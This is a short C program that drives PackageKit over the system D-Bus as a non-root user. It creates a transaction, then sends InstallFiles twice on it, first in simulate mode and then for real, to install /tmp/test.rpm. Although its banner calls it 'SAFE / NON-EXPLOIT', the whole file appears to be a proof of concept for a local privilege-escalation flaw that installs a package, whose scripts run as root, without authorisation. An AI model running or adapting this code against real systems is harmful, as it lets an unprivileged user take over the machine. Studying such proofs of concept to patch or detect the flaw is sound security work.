#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <glib.h>
#include <gio/gio.h>

/* ── config ───────────────────────────────────────── */
#define PK_BUS        "org.freedesktop.PackageKit"
#define PK_OBJ        "/org/freedesktop/PackageKit"
#define PK_IFACE      "org.freedesktop.PackageKit"
#define PK_TX_IFACE   "org.freedesktop.PackageKit.Transaction"

#define FLAG_NONE     ((guint64)0)
#define FLAG_SIMULATE ((guint64)(1u << 2))  /* simulate flag */

/* ── context ─────────────────────────────────────── */
typedef struct {
    GMainLoop *loop;
} Ctx;

/* ── callbacks ───────────────────────────────────── */
static void cb_finished(GDBusConnection *c,
                        const gchar *s,
                        const gchar *o,
                        const gchar *i,
                        const gchar *n,
                        GVariant *p,
                        gpointer user_data)
{
    printf("[DEBUG SIGNAL] Finished received\n");

    guint32 exit_code, runtime;
    g_variant_get(p, "(uu)", &exit_code, &runtime);

    printf("[*] Finished (exit=%u, runtime=%u ms)\n", exit_code, runtime);

    Ctx *ctx = user_data;
    g_main_loop_quit(ctx->loop);
}

static void cb_error(GDBusConnection *c,
                     const gchar *s,
                     const gchar *o,
                     const gchar *i,
                     const gchar *n,
                     GVariant *p,
                     gpointer user_data)
{
    printf("[DEBUG SIGNAL] ErrorCode received\n");

    guint32 code;
    const gchar *details;

    g_variant_get(p, "(u&s)", &code, &details);
    printf("[!] Error %u: %s\n", code, details);
}

static void cb_status(GDBusConnection *c,
                      const gchar *s,
                      const gchar *o,
                      const gchar *i,
                      const gchar *n,
                      GVariant *p,
                      gpointer user_data)
{
    printf("[DEBUG SIGNAL] StatusChanged received\n");

    guint32 status;
    g_variant_get(p, "(u)", &status);

    printf("[*] Status: %u\n", status);
}

/* ── helper ─────────────────────────────────────── */
static char *pk_create_tx(GDBusConnection *conn)
{
    printf("[DEBUG] Creating transaction...\n");

    GError *err = NULL;

    GVariant *res = g_dbus_connection_call_sync(
        conn,
        PK_BUS,
        PK_OBJ,
        PK_IFACE,
        "CreateTransaction",
        NULL,
        G_VARIANT_TYPE("(o)"),
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        &err
    );

    if (!res) {
        fprintf(stderr, "[-] CreateTransaction failed: %s\n", err->message);
        g_error_free(err);
        return NULL;
    }

    const gchar *tid;
    g_variant_get(res, "(&o)", &tid);

    char *copy = g_strdup(tid);
    g_variant_unref(res);

    printf("[DEBUG] Transaction created: %s\n", copy);

    return copy;
}

/* async debug callback (TIDAK mengubah logic utama) */
static void async_debug_cb(GObject *source,
                           GAsyncResult *res,
                           gpointer user_data)
{
    printf("[DEBUG] Async callback triggered\n");

    GError *err = NULL;
    GDBusConnection *conn = G_DBUS_CONNECTION(source);

    GVariant *ret = g_dbus_connection_call_finish(conn, res, &err);

    if (!ret) {
        printf("[DEBUG] Async call FAILED: %s\n", err->message);
        g_error_free(err);
        return;
    }

    printf("[DEBUG] Async call OK\n");
    g_variant_unref(ret);
}

/* ── main action ───────────────────────────────────── */
static void pk_install_files_async(GDBusConnection *conn,
                                   const char *tid,
                                   guint64 flags,
                                   const char *path)
{
    const char *paths[] = { path, NULL };

    printf("[DEBUG] InstallFiles called -> tid=%s flags=%lu path=%s\n",
           tid, flags, path);

    g_dbus_connection_call(
        conn,
        PK_BUS,
        tid,
        PK_TX_IFACE,
        "InstallFiles",
        g_variant_new("(t^as)", flags, paths),
        NULL,
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        async_debug_cb,
        NULL
    );
}

/* ── main ───────────────────────────────────────── */
int main(void)
{
    puts("═══════════════════════════════════════════════");
    puts(" PackageKit RPM Test (SAFE / NON-EXPLOIT + DEBUG)");
    puts("═══════════════════════════════════════════════\n");

    printf("[DEBUG] Program start\n");

    if (geteuid() == 0) {
        fprintf(stderr, "[-] Jangan jalankan sebagai root\n");
        return 1;
    }

    const char *rpm = "/tmp/test.rpm";

    if (access(rpm, F_OK) != 0) {
        fprintf(stderr, "[-] File RPM tidak ditemukan: %s\n", rpm);
        return 1;
    }

    printf("[*] Using RPM: %s\n", rpm);

    /* connect dbus */
    printf("[DEBUG] Connecting to system bus...\n");

    GError *err = NULL;
    GDBusConnection *conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &err);

    if (!conn) {
        fprintf(stderr, "[-] DBus error: %s\n", err->message);
        g_error_free(err);
        return 1;
    }

    printf("[DEBUG] Connected to system bus\n");

    char *tid = pk_create_tx(conn);
    if (!tid) return 1;

    Ctx ctx;
    ctx.loop = g_main_loop_new(NULL, FALSE);

    printf("[DEBUG] Subscribing signals for tid: %s\n", tid);

    /* subscribe signals */
    g_dbus_connection_signal_subscribe(conn, PK_BUS, PK_TX_IFACE,
        "Finished", tid, NULL, 0, cb_finished, &ctx, NULL);

    g_dbus_connection_signal_subscribe(conn, PK_BUS, PK_TX_IFACE,
        "ErrorCode", tid, NULL, 0, cb_error, NULL, NULL);

    g_dbus_connection_signal_subscribe(conn, PK_BUS, PK_TX_IFACE,
        "StatusChanged", tid, NULL, 0, cb_status, NULL, NULL);

    /* ── flow ── */
    printf("[DEBUG] Step 1 SIMULATE\n");
    pk_install_files_async(conn, tid, FLAG_SIMULATE, rpm);

    printf("[DEBUG] Step 2 REAL CALL\n");
    pk_install_files_async(conn, tid, FLAG_NONE, rpm);

    g_dbus_connection_flush_sync(conn, NULL, NULL);

    printf("[DEBUG] Entering main loop...\n");

    g_main_loop_run(ctx.loop);

    printf("[DEBUG] Main loop exited\n");

    g_free(tid);
    g_object_unref(conn);

    return 0;
}
